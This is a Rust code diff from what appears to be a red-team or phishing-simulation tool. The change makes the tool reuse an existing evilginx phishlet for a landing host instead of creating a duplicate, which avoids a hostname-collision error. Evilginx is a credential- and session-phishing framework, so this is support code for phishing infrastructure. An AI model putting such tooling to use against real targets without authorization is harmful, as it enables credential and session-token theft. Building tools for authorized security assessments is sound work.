@@ -8,7 +8,8 @@ use serde_json::{json, Value};
 use crate::assessment;
 use crate::db::{self, Profile, UpsertProfile};
 use crate::engagement::{
-    default_dryrun_domain, normalize_target_host, phishlet_name_for_target, upstream_domain,
+    default_dryrun_domain, find_reusable_phishlet, normalize_target_host, phishlet_name_for_target,
+    upstream_domain,
 };
 use crate::error::{AppError, AppResult};
 use crate::kit::kit_root;
@@ -174,6 +175,32 @@ fn ensure_phishlet(
                 message: "Using existing phishlet".into(),
             });
         }
+    }
+
+    // Reuse an existing phishlet that already serves this landing host instead of
+    // scaffolding a duplicate. Two enabled phishlets with the same landing host make
+    // evilginx refuse to load with a "hostname collision" error (audit C1.5).
+    let phishlets_dir = root.join("kit/evilginx/phishlets");
+    if let Some(existing) = find_reusable_phishlet(&phishlets_dir, &host, &name) {
+        let existing_path = phishlets_dir.join(format!("{existing}.yaml"));
+        let mut info = stack_info.clone();
+        if info.login_path.is_none() {
+            info.login_path = Some("/login".into());
+        }
+        return Ok(GenerateResult {
+            ok: true,
+            phishlet: existing.clone(),
+            dryrun_domain: default_dryrun_domain(&host),
+            target_domain: host.clone(),
+            upstream_domain: upstream_domain(&host),
+            stack_info: info,
+            path: existing_path.display().to_string(),
+            created: false,
+            message: format!(
+                "Reusing existing phishlet '{existing}' (same landing host as '{host}') \
+                 to avoid an evilginx hostname collision"
+            ),
+        });
     }
 
     if stack == "firebase" {
